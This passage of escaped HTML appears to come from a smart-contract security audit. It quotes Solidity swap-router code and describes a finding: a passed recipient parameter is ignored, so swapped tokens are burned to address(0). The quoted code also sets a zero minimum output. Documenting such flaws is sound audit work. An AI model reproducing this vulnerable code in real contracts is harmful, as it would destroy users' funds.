class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eensure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBoth functions pass the \u003ccode\u003e_to\u003c/code\u003e parameter to \u003ccode\u003e_swap\u003c/code\u003e, but it’s never used - the function only uses \u003ccode\u003eroutes[i].receiver\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_swap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eISwapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eExactInputSingleParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einputParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einputParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eISwapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eExactInputSingleParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ({\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIn:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenOut:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairToDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecipient:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOutMinimum:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elimitSqrtPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eISwapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexactInputSingle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einputParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esortTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount0Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount1Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount0Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount1Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis results in 100% loss of user funds as all swapped tokens are sent to \u003ccode\u003eaddress(0)\u003c/code\u003e and permanently burned. Every swap transaction through these functions will fail to deliver tokens to users.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNote: The API helper does correctly set receiver addresses in its \u003ccode\u003e_createRoute\u003c/code\u003e function:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createRoute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBasic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e 